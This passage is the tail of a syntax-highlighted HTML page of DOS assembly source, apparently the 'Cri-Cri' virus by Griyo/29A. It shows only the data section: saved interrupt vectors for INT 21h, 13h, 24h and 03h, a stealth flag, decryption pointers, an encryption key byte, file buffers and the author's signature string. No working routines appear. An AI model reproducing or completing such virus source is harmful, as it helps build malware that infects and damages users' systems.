</span><span class="sc5">decrypt_sub</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">address_loop</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">decrypt_pointer</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">address_register</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">decrypt_register</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">address_seg_1</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">address_seg_2</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Virus data buffer</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">old21h</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old21h_off</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old21h_seg</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">org21h</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">org21h_off</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">org21h_seg</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old13h</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old13h_off</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old13h_seg</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old24h</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old24h_off</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old24h_seg</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old03h</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old03h_off</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old03h_seg</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">read_ptr</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">read_off</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">read_seg</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">dos_flag</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">prog_type</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C"</span><span class="sc0">
</span><span class="sc5">running_sw</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"R"</span><span class="sc0">
</span><span class="sc5">stealth_sw</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">dos_function</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">ret_off</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">today</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">file_offset</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">text_birthday</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Cri-Cri ViRuS by Griyo/29A"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" ...Tried, tested, not approved."</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">file_buffer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">old_header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">clave_crypt</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Buffer for working area</span><span class="sc0">
</span><span class="sc5">virus_copy</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">com</span><span class="sc0">     </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">virus_entry</span><span class="sc0">
</span></div></body>
</html>
